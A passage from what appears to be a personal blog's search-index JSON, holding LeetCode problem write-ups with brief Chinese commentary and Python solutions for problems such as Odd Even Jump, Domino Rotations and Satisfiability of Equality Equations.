-\u0026gt; int: high = {} stk = [] for n,i in sorted([(n,i) for i,n in enumerate(arr)]): while stk and stk[-1] \u0026lt; i: high[stk.pop()] = i stk += i, low = {} stk = [] for n,i in sorted([(-n,i) for i,n in enumerate(arr)]): while stk and stk[-1] \u0026lt; i: low[stk.pop()] = i stk += i, @cache def dp(i, even): if i == len(arr)-1: return True elif even: j = low.get(i, -1) else: j = high.get(i, -1) return j != -1 and dp(j, not even) return sum(dp(i, False) for i in range(len(arr))) ","permalink":"https://littlebees.github.io/2021/09/leetcode-975-odd-even-jump/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elee215，不用質疑的神\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e用Monotonic Stack+sort求最小(大)的最近的index!!\u003c/li\u003e\n\u003c/ul\u003e","title":"leetcode-975 - Odd Even Jump"},{"content":"動機 不要忘了reverse很好用\nProblem You are given a license key represented as a string s that consists of only alphanumeric characters and dashes. The string is separated into n + 1 groups by n dashes. You are also given an integer k.\nWe want to reformat the string s such that each group contains exactly k characters, except for the first group, which could be shorter than k but still must contain at least one character. Furthermore, there must be a dash inserted between two groups, and you should convert all lowercase letters to uppercase.\nReturn the reformatted license key.\nExample 1:\nInput: s = \"5F3Z-2e-9-w\", k = 4Output: \"5F3Z-2E9W\"Explanation: The string s has been split into two parts, each part has 4 characters.Note that the two extra dashes are not needed and can be removed.Example 2:\nInput: s = \"2-5g-3-J\", k = 2Output: \"2-5G-3J\"Explanation: The string s has been split into three parts, each part has 2 characters except the first part as it could be shorter as mentioned above. Constraints:\n1 \u003c= s.length \u003c= 105s consists of English letters, digits, and dashes '-'.1 \u003c= k \u003c= 104 Sol 從最後一個字去分組，最後再reverse\nclass Solution: def licenseKeyFormatting(self, s: str, k: int) -\u0026gt; str: cs = [c for c in s if c != \u0026#34;-\u0026#34;][::-1] ss = [] i = 0 while i \u0026lt; len(cs): tmp = [] for _ in range(k): if i \u0026lt; len(cs): tmp += cs[i].upper(), i += 1 else: break if tmp: ss += \u0026#39;\u0026#39;.join(tmp), return \u0026#39;-\u0026#39;.join(ss)[::-1] ","permalink":"https://littlebees.github.io/2021/09/leetcode-482-license-key-formatting/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不要忘了reverse很好用\u003c/p\u003e","title":"leetcode-482 - License Key Formatting"},{"content":"動機 lee215的解法依舊漂亮\nProblem In a row of dominoes, tops[i] and bottoms[i] represent the top and bottom halves of the ith domino. (A domino is a tile with two numbers from 1 to 6 - one on each half of the tile.)\nWe may rotate the ith domino, so that tops[i] and bottoms[i] swap values.\nReturn the minimum number of rotations so that all the values in tops are the same, or all the values in bottoms are the same.\nIf it cannot be done, return -1.\nExample 1:\nInput: tops = [2,1,2,4,2,2], bottoms = [5,2,6,2,3,2]Output: 2Explanation: The first figure represents the dominoes as given by tops and bottoms: before we do any rotations.If we rotate the second and fourth dominoes, we can make every value in the top row equal to 2, as indicated by the second figure.Example 2:\nInput: tops = [3,5,1,2,3], bottoms = [3,6,3,3,4]Output: -1Explanation: In this case, it is not possible to rotate the dominoes to make one row of values equal. Constraints:\n2 \u003c= tops.length \u003c= 2 * 104bottoms.length == tops.length1 \u003c= tops[i], bottoms[i] \u003c= 6 Sol 就六個數字就是看有沒有就好\nclass Solution: def minDominoRotations(self, tops: List[int], bottoms: List[int]) -\u0026gt; int: for n in range(1,7): good = True lhs = rhs = 0 for a,b in zip(tops,bottoms): if n not in (a,b): good = False break elif n == a and n != b: lhs += 1 elif n == b and n != a: rhs += 1 if good: return min(lhs, rhs) return -1 ","permalink":"https://littlebees.github.io/2021/09/leetcode-1007-minimum-domino-rotations-for-equal-row/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003elee215的解法依舊漂亮\u003c/p\u003e","title":"leetcode-1007 - Minimum Domino Rotations For Equal Row"},{"content":"動機 當初以為只要把最大或最小3個去掉就好\u0026hellip;\nProblem Given an array nums, you are allowed to choose one element of nums and change it by any value in one move.\nReturn the minimum difference between the largest and smallest value of nums after perfoming at most 3 moves.\nExample 1:\nInput: nums = [5,3,2,4]Output: 0Explanation: Change the array [5,3,2,4] to [2,2,2,2].The difference between the maximum and minimum is 2-2 = 0.Example 2:\nInput: nums = [1,5,0,10,14]Output: 1Explanation: Change the array [1,5,0,10,14] to [1,1,0,1,1]. The difference between the maximum and minimum is 1-0 = 1.Example 3:\nInput: nums = [6,6,0,1,1,4,6]Output: 2Example 4:\nInput: nums = [1,5,6,14,15]Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 10^5-10^9 \u003c= nums[i] \u003c= 10^9 Sol sort，會有4個case\n3大 1小2大 2小1大 3小 class Solution: def minDifference(self, nums: List[int]) -\u0026gt; int: if len(nums) \u0026lt;= 4: return 0 else: nums.sort() return min(nums[-4]-nums[0], nums[-3]-nums[1], nums[-2]-nums[2], nums[-1]-nums[3]) 可以只sort一部分嗎?\nclass Solution: def minDifference(self, nums: List[int]) -\u0026gt; int: if len(nums) \u0026lt;= 4: return 0 else: return min(a - b for a,b in zip(heapq.nlargest(4, nums), heapq.nsmallest(4, nums)[::-1])) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1509-minimum-difference-between-largest-and-smallest-value-in-three-moves/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當初以為只要把最大或最小3個去掉就好\u0026hellip;\u003c/p\u003e","title":"leetcode-1509 - Minimum Difference Between Largest and Smallest Value in Three Moves"},{"content":"動機 可以當成有一個bar，從左邊推到右邊\nProblem You are given a string s, a split is called good if you can split s into 2 non-empty strings p and q where its concatenation is equal to s and the number of distinct letters in p and q are the same.\nReturn the number of good splits you can make in s.\nExample 1:\nInput: s = \"aacaba\"Output: 2Explanation: There are 5 ways to split \"aacaba\" and 2 of them are good. (\"a\", \"acaba\") Left string and right string contains 1 and 3 different letters respectively.(\"aa\", \"caba\") Left string and right string contains 1 and 3 different letters respectively.(\"aac\", \"aba\") Left string and right string contains 2 and 2 different letters respectively (good split).(\"aaca\", \"ba\") Left string and right string contains 2 and 2 different letters respectively (good split).(\"aacab\", \"a\") Left string and right string contains 3 and 1 different letters respectively.Example 2:\nInput: s = \"abcd\"Output: 1Explanation: Split the string as follows (\"ab\", \"cd\").Example 3:\nInput: s = \"aaaaa\"Output: 4Explanation: All possible splits are good.Example 4:\nInput: s = \"acbadbaada\"Output: 2 Constraints:\ns contains only lowercase English letters.1 \u003c= s.length \u003c= 10^5 Sol class Solution: def numSplits(self, s: str) -\u0026gt; int: left ,right = set(), Counter(s) ret = 0 for c in s: left.add(c) right[c] -= 1 if not right[c]: del right[c] if len(left) == len(right): ret += 1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-1525-number-of-good-ways-to-split-a-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e可以當成有一個bar，從左邊推到右邊\u003c/p\u003e","title":"leetcode-1525 - Number of Good Ways to Split a String"},{"content":"動機 最好幾次的coin change\nProblem You would like to make dessert and are preparing to buy the ingredients. You have n ice cream base flavors and m types of toppings to choose from. You must follow these rules when making your dessert:\nThere must be exactly one ice cream base.You can add one or more types of topping or have no toppings at all.There are at most two of each type of topping.You are given three inputs:\nbaseCosts, an integer array of length n, where each baseCosts[i] represents the price of the ith ice cream base flavor.toppingCosts, an integer array of length m, where each toppingCosts[i] is the price of one of the ith topping.target, an integer representing your target price for dessert.You want to make a dessert with a total cost as close to target as possible.\nReturn the closest possible cost of the dessert to target. If there are multiple, return the lower one.\nExample 1:\nInput: baseCosts = [1,7], toppingCosts = [3,4], target = 10Output: 10Explanation: Consider the following combination (all 0-indexed):- Choose base 1: cost 7- Take 1 of topping 0: cost 1 x 3 = 3- Take 0 of topping 1: cost 0 x 4 = 0Total: 7 + 3 + 0 = 10.Example 2:\nInput: baseCosts = [2,3], toppingCosts = [4,5,100], target = 18Output: 17Explanation: Consider the following combination (all 0-indexed):- Choose base 1: cost 3- Take 1 of topping 0: cost 1 x 4 = 4- Take 2 of topping 1: cost 2 x 5 = 10- Take 0 of topping 2: cost 0 x 100 = 0Total: 3 + 4 + 10 + 0 = 17. You cannot make a dessert with a total cost of 18.Example 3:\nInput: baseCosts = [3,10], toppingCosts = [2,5], target = 9Output: 8Explanation: It is possible to make desserts with cost 8 and 10. Return 8 as it is the lower cost.Example 4:\nInput: baseCosts = [10], toppingCosts = [1], target = 1Output: 10Explanation: Notice that you don't have to have any toppings, but you must have exactly one base. Constraints:\nn == baseCosts.lengthm == toppingCosts.length1 \u003c= n, m \u003c= 101 \u003c= baseCosts[i], toppingCosts[i] \u003c= 1041 \u003c= target \u003c= 104 Sol class Solution: def closestCost(self, bs: List[int], ts: List[int], target: int) -\u0026gt; int: @cache def coin(cnt,j): if j \u0026gt;= len(ts) or cnt \u0026gt;= target: return cnt else: return min([coin(cnt+ts[j]*2,j+1),coin(cnt+ts[j],j+1),coin(cnt,j+1)], key=lambda x: (abs(x-target), x-target)) return min([coin(x,0) for x in bs], key=lambda x: (abs(x-target), x-target)) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1774-closest-dessert-cost/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e最好幾次的coin change\u003c/p\u003e","title":"leetcode-1774 - Closest Dessert Cost"},{"content":"動機 其實有level也可以用dfs的\nProblem Given the root of a binary tree, the level of its root is 1, the level of its children is 2, and so on.\nReturn the smallest level x such that the sum of all the values of nodes at level x is maximal.\nExample 1:\nInput: root = [1,7,0,7,-8,Leetcode,null]Output: 2Explanation: Level 1 sum = 1.Level 2 sum = 7 + 0 = 7.Level 3 sum = 7 + -8 = -1.So we return the level with the maximum sum which is level 2.Example 2:\nInput: root = [989,null,10250,98693,-89388,null,null,null,-32127]Output: 2 Constraints:\nThe number of nodes in the tree is in the range [1, 104].-105 \u003c= Node.val \u003c= 105 Sol class Solution: def maxLevelSum(self, root: Optional[TreeNode]) -\u0026gt; int: sums = defaultdict(int) def dfs(root, dep): if root: sums[dep] += root.val dfs(root.left, dep+1) dfs(root.right, dep+1) dfs(root, 1) return max(sums.items(), key=lambda p: p[1])[0] ","permalink":"https://littlebees.github.io/2021/09/leetcode-1161-maximum-level-sum-of-a-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e其實有level也可以用dfs的\u003c/p\u003e","title":"leetcode-1161 - Maximum Level Sum of a Binary Tree"},{"content":"動機 與446差在只看每個位置的前一個就好\nProblem An integer array is called arithmetic if it consists of at least three elements and if the difference between any two consecutive elements is the same.\nFor example, [1,3,5,7,9], [7,7,7,7], and [3,-1,-5,-9] are arithmetic sequences.Given an integer array nums, return the number of arithmetic subarrays of nums.\nA subarray is a contiguous subsequence of the array.\nExample 1:\nInput: nums = [1,2,3,4]Output: 3Explanation: We have 3 arithmetic slices in nums: [1, 2, 3], [2, 3, 4] and [1,2,3,4] itself.Example 2:\nInput: nums = [1]Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 5000-1000 \u003c= nums[i] \u003c= 1000 Sol class Solution: def numberOfArithmeticSlices(self, nums: List[int]) -\u0026gt; int: dp = defaultdict(lambda : defaultdict(int)) ret = 0 for i in range(1,len(nums)): j = i-1 diff = nums[i]-nums[j] ret += dp[j][diff] # Use all comb whose size is bigger than 1 to construct this case!! dp[i][diff] += dp[j][diff]+1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-413-arithmetic-slices/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e與446差在\u003cstrong\u003e只看每個位置的前一個就好\u003c/strong\u003e\u003c/p\u003e","title":"leetcode-413 - Arithmetic Slices"},{"content":"動機 就是merge interval，但要記得紀錄merge幾個interval\nProblem Given an array intervals where intervals[i] = [li, ri] represent the interval [li, ri), remove all intervals that are covered by another interval in the list.\nThe interval [a, b) is covered by the interval [c, d) if and only if c \u003c= a and b \u003c= d.\nReturn the number of remaining intervals.\nExample 1:\nInput: intervals = [[1,4],[3,6],[2,8]]Output: 2Explanation: Interval [3,6] is covered by [2,8], therefore it is removed.Example 2:\nInput: intervals = [[1,4],[2,3]]Output: 1Example 3:\nInput: intervals = [[0,10],[5,12]]Output: 2Example 4:\nInput: intervals = [[3,10],[4,10],[5,11]]Output: 2Example 5:\nInput: intervals = [[1,2],[1,4],[3,4]]Output: 1 Constraints:\n1 \u003c= intervals.length \u003c= 1000intervals[i].length == 20 \u003c= li \u003c= ri \u003c= 105All the given intervals are unique. Sol class Solution: def removeCoveredIntervals(self, intervals: List[List[int]]) -\u0026gt; int: intervals.sort(key=lambda x: (x[0],-x[1])) stk = [[intervals[0],1]] for c,d in intervals[1:]: a,b = stk[-1][0] if a \u0026lt;= d \u0026lt;= b: continue elif a \u0026lt;= c \u0026lt;= b: stk[-1][0] = [min(a,c),max(b,d)] stk[-1][1] += 1 else: stk.append([[c,d],1]) #print(stk) return sum([x[1] for x in stk]) ","permalink":"https://littlebees.github.io/2021/09/leetcode-1288-remove-covered-intervals/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是merge interval，但要記得紀錄merge幾個interval\u003c/p\u003e","title":"leetcode-1288 - Remove Covered Intervals"},{"content":"動機 也是數學，(a*b) % c等於(a%c)*(b%c)\nProblem Your task is to calculate ab mod 1337 where a is a positive integer and b is an extremely large positive integer given in the form of an array.\nExample 1:\nInput: a = 2, b = [3]Output: 8Example 2:\nInput: a = 2, b = [1,0]Output: 1024Example 3:\nInput: a = 1, b = [4,3,3,8,5,2]Output: 1Example 4:\nInput: a = 2147483647, b = [2,0,0]Output: 1198 Constraints:\n1 \u003c= a \u003c= 231 - 11 \u003c= b.length \u003c= 20000 \u003c= b[i] \u003c= 9b doesn't contain leading zeros. Sol class Solution: def superPow(self, a: int, b: List[int]) -\u0026gt; int: a = a % 1337 b = int(\u0026#39;\u0026#39;.join([str(x) for x in b])) def pow(a,b): if b == 0: return 1 if b == 1: return a else: if b%2 == 1: ret = a*pow(a,b-1) else: ret = pow(a,b//2)**2 if ret \u0026gt; 1337: ret = ret % 1337 return ret return pow(a,b) ","permalink":"https://littlebees.github.io/2021/09/leetcode-372-super-pow/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e也是數學，\u003ccode\u003e(a*b) % c\u003c/code\u003e等於\u003ccode\u003e(a%c)*(b%c)\u003c/code\u003e\u003c/p\u003e","title":"leetcode-372 - Super Pow"},{"content":"動機 有趣的數學題\nProblem There are n bulbs that are initially off. You first turn on all the bulbs, then you turn off every second bulb.\nOn the third round, you toggle every third bulb (turning on if it's off or turning off if it's on). For the ith round, you toggle every i bulb. For the nth round, you only toggle the last bulb.\nReturn the number of bulbs that are on after n rounds.\nExample 1:\nInput: n = 3Output: 1Explanation: At first, the three bulbs are [off, off, off].After the first round, the three bulbs are [on, on, on].After the second round, the three bulbs are [on, off, on].After the third round, the three bulbs are [on, off, off]. So you should return 1 because there is only one bulb is on.Example 2:\nInput: n = 0Output: 0Example 3:\nInput: n = 1Output: 1 Constraints:\n0 \u003c= n \u003c= 109 Sol 任何平方數都是1,n,n^2，所以平方數到最後一定會亮!!\nclass Solution: def bulbSwitch(self, n: int) -\u0026gt; int: return math.floor(math.sqrt(n)) ","permalink":"https://littlebees.github.io/2021/09/leetcode-319-bulb-switcher/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有趣的數學題\u003c/p\u003e","title":"leetcode-319 - Bulb Switcher"},{"content":"動機 就dfs，同時因為是dag所以不用處理cycle\nProblem Given a directed acyclic graph (DAG) of n nodes labeled from 0 to n - 1, find all possible paths from node 0 to node n - 1 and return them in any order.\nThe graph is given as follows: graph[i] is a list of all nodes you can visit from node i (i.e., there is a directed edge from node i to node graph[i][j]).\nExample 1:\nInput: graph = [[1,2],[3],[3],[]]Output: [[0,1,3],[0,2,3]]Explanation: There are two paths: 0 -\u003e 1 -\u003e 3 and 0 -\u003e 2 -\u003e 3.Example 2:\nInput: graph = [[4,3,1],[3,2,4],[3],[4],[]]Output: [[0,4],[0,3,4],[0,1,3,4],[0,1,2,3,4],[0,1,4]]Example 3:\nInput: graph = [[1],[]]Output: [[0,1]]Example 4:\nInput: graph = [[1,2,3],[2],[3],[]]Output: [[0,1,2,3],[0,2,3],[0,3]]Example 5:\nInput: graph = [[1,3],[2],[3],[]]Output: [[0,1,2,3],[0,3]] Constraints:\nn == graph.length2 \u003c= n \u003c= 150 \u003c= graph[i][j] \u003c ngraph[i][j] != i (i.e., there will be no self-loops).All the elements of graph[i] are unique.The input graph is guaranteed to be a DAG. Sol class Solution: def allPathsSourceTarget(self, gh: List[List[int]]) -\u0026gt; List[List[int]]: def dfs(n, path): if n == len(gh)-1: return [path+[n]] else: ret = [] for x in gh[n]: ret += dfs(x, path+[n]) return ret return dfs(0,[]) ","permalink":"https://littlebees.github.io/2021/09/leetcode-797-all-paths-from-source-to-target/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就dfs，同時因為是dag所以不用處理cycle\u003c/p\u003e","title":"leetcode-797 - All Paths From Source to Target"},{"content":"動機 string as symbol!!\nProblem Given the root of a binary tree, return all duplicate subtrees.\nFor each kind of duplicate subtrees, you only need to return the root node of any one of them.\nTwo trees are duplicate if they have the same structure with the same node values.\nExample 1:\nInput: root = [1,2,3,4,Leetcode,2,4,null,null,4]Output: [[2,4],[4]]Example 2:\nInput: root = [2,1,1]Output: [[1]]Example 3:\nInput: root = [2,2,2,3,null,3,null]Output: [[2,3],[3]] Constraints:\nThe number of the nodes in the tree will be in the range [1, 10^4]-200 \u003c= Node.val \u003c= 200 Sol class Solution: def findDuplicateSubtrees(self, root: Optional[TreeNode]) -\u0026gt; List[Optional[TreeNode]]: tbl = defaultdict(list) def post(node): if not node: return \u0026#34;#\u0026#34; else: stree = f\u0026#39;{node.val},{post(node.left)},{post(node.right)}\u0026#39; tbl[stree].append(node) return stree post(root) return [vs[0] for vs in tbl.values() if len(vs) \u0026gt; 1] ","permalink":"https://littlebees.github.io/2021/09/leetcode-652-find-duplicate-subtrees/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003estring as symbol!!\u003c/p\u003e","title":"leetcode-652 - Find Duplicate Subtrees"},{"content":"動機 水，但好像可以用數學解，但我看不懂\nProblem You have a set of integers s, which originally contains all the numbers from 1 to n. Unfortunately, due to some error, one of the numbers in s got duplicated to another number in the set, which results in repetition of one number and loss of another number.\nYou are given an integer array nums representing the data status of this set after the error.\nFind the number that occurs twice and the number that is missing and return them in the form of an array.\nExample 1:\nInput: nums = [1,2,2,4]Output: [2,3]Example 2:\nInput: nums = [1,1]Output: [1,2] Constraints:\n2 \u003c= nums.length \u003c= 1041 \u003c= nums[i] \u003c= 104 Sol class Solution: def findErrorNums(self, nums: List[int]) -\u0026gt; List[int]: return [[k for k,v in Counter(nums).items() if v==2][0], list(set(range(1,len(nums)+1))-set(nums))[0]] ","permalink":"https://littlebees.github.io/2021/09/leetcode-645-set-mismatch/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水，但好像可以用數學解，但我看不懂\u003c/p\u003e","title":"leetcode-645 - Set Mismatch"},{"content":"動機 prefix sum但是從後面來\nProblem You are given a string s of lowercase English letters and an integer array shifts of the same length.\nCall the shift() of a letter, the next letter in the alphabet, (wrapping around so that 'z' becomes 'a').\nFor example, shift('a') = 'b', shift('t') = 'u', and shift('z') = 'a'.Now for each shifts[i] = x, we want to shift the first i + 1 letters of s, x times.\nReturn the final string after all such shifts to s are applied.\nExample 1:\nInput: s = \"abc\", shifts = [3,5,9]Output: \"rpl\"Explanation: We start with \"abc\".After shifting the first 1 letters of s by 3, we have \"dbc\".After shifting the first 2 letters of s by 5, we have \"igc\".After shifting the first 3 letters of s by 9, we have \"rpl\", the answer.Example 2:\nInput: s = \"aaa\", shifts = [1,2,3]Output: \"gfd\" Constraints:\n1 \u003c= s.length \u003c= 105s consists of lowercase English letters.shifts.length == s.length0 \u003c= shifts[i] \u003c= 109 Sol class Solution: def shiftingLetters(self, s: str, shifts: List[int]) -\u0026gt; str: sums = shifts[::-1] for i in range(1,len(sums)): sums[i] += sums[i-1] sums = [x % 26 for x in sums[::-1]] #print(sums) return \u0026#39;\u0026#39;.join([chr(ord(\u0026#39;a\u0026#39;) + (ord(c) - ord(\u0026#39;a\u0026#39;) + i) % 26) for i,c in zip(sums, s)]) ","permalink":"https://littlebees.github.io/2021/09/leetcode-848-shifting-letters/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eprefix sum但是從後面來\u003c/p\u003e","title":"leetcode-848 - Shifting Letters"},{"content":"動機 就開根號\nProblem Given a non-negative integer c, decide whether there're two integers a and b such that a2 + b2 = c.\nExample 1:\nInput: c = 5Output: trueExplanation: 1 * 1 + 2 * 2 = 5Example 2:\nInput: c = 3Output: falseExample 3:\nInput: c = 4Output: trueExample 4:\nInput: c = 2Output: trueExample 5:\nInput: c = 1Output: true Constraints:\n0 \u003c= c \u003c= 231 - 1 Sol class Solution: def judgeSquareSum(self, c: int) -\u0026gt; bool: n = math.ceil(math.sqrt(c)) tbl = set() [tbl.add(x**2) for x in range(0,n+1)] return any((c-n in tbl) for n in tbl) ","permalink":"https://littlebees.github.io/2021/09/leetcode-633-sum-of-square-numbers/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就開根號\u003c/p\u003e","title":"leetcode-633 - Sum of Square Numbers"},{"content":"動機 模擬bubble sort\nProblem Given an array of integers arr, sort the array by performing a series of pancake flips.\nIn one pancake flip we do the following steps:\nChoose an integer k where 1 \u003c= k \u003c= arr.length.Reverse the sub-array arr[0...k-1] (0-indexed).For example, if arr = [3,2,1,4] and we performed a pancake flip choosing k = 3, we reverse the sub-array [3,2,1], so arr = [1,2,3,4] after the pancake flip at k = 3.\nReturn an array of the k-values corresponding to a sequence of pancake flips that sort arr. Any valid answer that sorts the array within 10 * arr.length flips will be judged as correct.\nExample 1:\nInput: arr = [3,2,4,1]Output: [4,2,4,3]Explanation: We perform 4 pancake flips, with k values 4, 2, 4, and 3.Starting state: arr = [3, 2, 4, 1]After 1st flip (k = 4): arr = [1, 4, 2, 3]After 2nd flip (k = 2): arr = [4, 1, 2, 3]After 3rd flip (k = 4): arr = [3, 2, 1, 4]After 4th flip (k = 3): arr = [1, 2, 3, 4], which is sorted.Example 2:\nInput: arr = [1,2,3]Output: []Explanation: The input is already sorted, so there is no need to flip anything.Note that other answers, such as [3, 3], would also be accepted. Constraints:\n1 \u003c= arr.length \u003c= 1001 \u003c= arr[i] \u003c= arr.lengthAll integers in arr are unique (i.e. arr is a permutation of the integers from 1 to arr.length). Sol class Solution: def pancakeSort(self, arr: List[int]) -\u0026gt; List[int]: ret = [] done = 0 while done \u0026lt; len(arr): i = max(range(len(arr)-done), key=arr.__getitem__) if i+1 != len(arr)-done: ret += i+1, arr[:i+1] = arr[:i+1][::-1] ret += len(arr)-done, arr[:len(arr)-done] = arr[:len(arr)-done][::-1] done+=1 return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-969-pancake-sorting/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e模擬bubble sort\u003c/p\u003e","title":"leetcode-969 - Pancake Sorting"},{"content":"動機 top-down只過了第一次，之後就過不了了\nProblem You are given an integer n. You have an n x n binary grid grid with all values initially 1's except for some indices given in the array mines. The ith element of the array mines is defined as mines[i] = [xi, yi] where grid[xi][yi] == 0.\nReturn the order of the largest axis-aligned plus sign of 1's contained in grid. If there is none, return 0.\nAn axis-aligned plus sign of 1's of order k has some center grid[r][c] == 1 along with four arms of length k - 1 going up, down, left, and right, and made of 1's. Note that there could be 0's or 1's beyond the arms of the plus sign, only the relevant area of the plus sign is checked for 1's.\nExample 1:\nInput: n = 5, mines = [[4,2]]Output: 2Explanation: In the above grid, the largest plus sign can only be of order 2. One of them is shown.Example 2:\nInput: n = 1, mines = [[0,0]]Output: 0Explanation: There is no plus sign, so return 0. Constraints:\n1 \u003c= n \u003c= 5001 \u003c= mines.length \u003c= 50000 \u003c= xi, yi \u003c nAll the pairs (xi, yi) are unique. Sol 所以就bottom-up\nclass Solution: def orderOfLargestPlusSign(self, n: int, mines: List[List[int]]) -\u0026gt; int: mines = set((x,y) for x,y in mines) left, right, up, down = defaultdict(int), defaultdict(int), defaultdict(int), defaultdict(int) for i in range(n): for j in range(n): if (i,j) not in mines: left[(i,j)] += 1+left[(i,j-1)] up[(i,j)] += 1+up[(i-1,j)] for i in reversed(range(n)): for j in reversed(range(n)): if (i,j) not in mines: right[(i,j)] += 1+right[(i,j+1)] down[(i,j)] += 1+down[(i+1,j)] ret = 0 for i in range(n): for j in range(n): ret = max(ret, min(left[(i,j)], up[(i,j)], right[(i,j)], down[(i,j)])) return ret ","permalink":"https://littlebees.github.io/2021/09/leetcode-764-largest-plus-sign/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003etop-down只過了第一次，之後就過不了了\u003c/p\u003e","title":"leetcode-764 - Largest Plus Sign"},{"content":"動機 都是從原點出發\nProblem You are given an m x n matrix M initialized with all 0's and an array of operations ops, where ops[i] = [ai, bi] means M[x][y] should be incremented by one for all 0 \u003c= x \u003c ai and 0 \u003c= y \u003c bi.\nCount and return the number of maximum integers in the matrix after performing all the operations.\nExample 1:\nInput: m = 3, n = 3, ops = [[2,2],[3,3]]Output: 4Explanation: The maximum integer in M is 2, and there are four of it in M. So return 4.Example 2:\nInput: m = 3, n = 3, ops = [[2,2],[3,3],[3,3],[3,3],[2,2],[3,3],[3,3],[3,3],[2,2],[3,3],[3,3],[3,3]]Output: 4Example 3:\nInput: m = 3, n = 3, ops = []Output: 9 Constraints:\n1 \u003c= m, n \u003c= 4 * 1040 \u003c= ops.length \u003c= 104ops[i].length == 21 \u003c= ai \u003c= m1 \u003c= bi \u003c= n Sol 所以直接找x與y的最小\nclass Solution: def maxCount(self, m: int, n: int, ops: List[List[int]]) -\u0026gt; int: ops = set(tuple(op) for op in ops) if not ops: return m*n else: a = b = float(\u0026#39;inf\u0026#39;) for x,y in ops: a = min(a, x) b = min(b, y) return a*b ","permalink":"https://littlebees.github.io/2021/09/leetcode-598-range-addition-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e都是從原點出發\u003c/p\u003e","title":"leetcode-598 - Range Addition II"},{"content":"動機 做兩遍union find!!\nProblem You are given an array of strings equations that represent relationships between variables where each string equations[i] is of length 4 and takes one of two different forms: \"xi==yi\" or \"xi!=yi\".Here, xi and yi are lowercase letters (not necessarily different) that represent one-letter variable names.\nReturn true if it is possible to assign integers to variable names so as to satisfy all the given equations, or false otherwise.\nExample 1:\nInput: equations = [\"a==b\",\"b!=a\"]Output: falseExplanation: If we assign say, a = 1 and b = 1, then the first equation is satisfied, but not the second.There is no way to assign the variables to satisfy both equations.Example 2:\nInput: equations = [\"b==a\",\"a==b\"]Output: trueExplanation: We could assign a = 1 and b = 1 to satisfy both equations.Example 3:\nInput: equations = [\"a==b\",\"b==c\",\"a==c\"]Output: trueExample 4:\nInput: equations = [\"a==b\",\"b!=c\",\"c==a\"]Output: falseExample 5:\nInput: equations = [\"c==c\",\"b==d\",\"x!=z\"]Output: true Constraints:\n1 \u003c= equations.length \u003c= 500equations[i].length == 4equations[i][0] is a lowercase letter.equations[i][1] is either '=' or '!'.equations[i][2] is '='.equations[i][3] is a lowercase letter. Sol 用union find把==串起來\n但是就算加rank還是會遇到[\u0026quot;a==b\u0026quot;,\u0026quot;e==c\u0026quot;,\u0026quot;b==c\u0026quot;,\u0026quot;a!=e\u0026quot;]這種不小心接到小的item的case\nclass Solution: def equationsPossible(self, es: List[str]) -\u0026gt; bool: var = set() [(var.add(e[0]), var.add(e[3])) for e in es] noteq = [(e[0],e[3]) for e in es if e[1] == \u0026#34;!\u0026#34;] eq = [(e[0],e[3]) for e in es if e[1] == \u0026#34;=\u0026#34;] uf = {v:v for v in var} rank = defaultdict(int) def find(v): while v != uf[v]: uf[v] = uf[uf[v]] v = uf[v] return v def union(a,b): x,y = find(a), find(b) if rank[x] \u0026gt;= rank[y]: uf[b] = a rank[a] += 1 else: uf[a] = b rank[b] += 1 [union(a,b) for a,b in eq] #print(uf, noteq) return all(find(a) != find(b) for a,b in noteq) ","permalink":"https://littlebees.github.io/2021/09/leetcode-990-satisfiability-of-equality-equations/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e做兩遍union find!!\u003c/p\u003e","title":"leetcode-990 - Satisfiability of Equality Equations"},{"content":"動機 先把礙事的處理掉就好!!\nProblem Given a parentheses string s containing only the characters '(' and ')'. A parentheses string is balanced if:\nAny left parenthesis '(' must have a corresponding two consecutive right parenthesis '))'.Left parenthesis '(' must go before the corresponding two consecutive right parenthesis '))'.In other words, we treat '(' as openning parenthesis and '))' as closing parenthesis.\nFor example, \"())\", \"())(())))\" and \"(())())))\" are balanced, \")()\", \"()))\" and \"(()))\" are not balanced.\nYou can insert the characters '(' and ')' at any position of the string to balance it if needed.\nReturn the minimum number of insertions needed to make s balanced.\nExample 1:\nInput: s = \"(()))\"Output: 1Explanation: The second '(' has two matching '))', but the first '(' has only ')' matching. We need to to add one more ')' at the end of the string to be \"(())))\" which is balanced.Example 2:\nInput: s = 